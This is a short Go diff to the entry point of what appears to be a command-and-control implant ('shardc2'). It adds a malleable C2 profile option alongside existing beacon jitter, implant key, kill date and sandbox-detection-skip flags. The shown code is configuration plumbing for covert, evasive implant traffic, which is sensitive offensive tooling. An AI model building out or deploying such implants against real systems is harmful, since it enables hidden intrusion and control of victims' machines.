@@ -12,6 +12,7 @@ import (
 
 	"github.com/shardc2/shardc2/internal/agent"
 	"github.com/shardc2/shardc2/pkg/crypto"
+	"github.com/shardc2/shardc2/pkg/profiles"
 )
 
 var (
@@ -32,6 +33,7 @@ func main() {
 		jitter     = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
 		daemon         = flag.Bool("daemon", false, "Run in daemon mode (suppress banner)")
 		ignoreSandbox  = flag.Bool("ignore-sandbox", false, "Skip sandbox detection checks")
+		profileName    = flag.String("profile", "default", "Malleable C2 profile name")
 	)
 	flag.Parse()
 
@@ -72,6 +74,11 @@ func main() {
 		}
 	}
 
+	profile, _ := profiles.Load(*profileName)
+	if profile == nil {
+		profile = profiles.Default()
+	}
+
 	cfg := agent.Config{
 		ServerURL:  *serverURL,
 		ImplantKey: *implantKey,
@@ -80,6 +87,7 @@ func main() {
 		Interval:   *interval,
 		Jitter:     *jitter,
 		KillDate:   kd,
+		Profile:    profile,
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
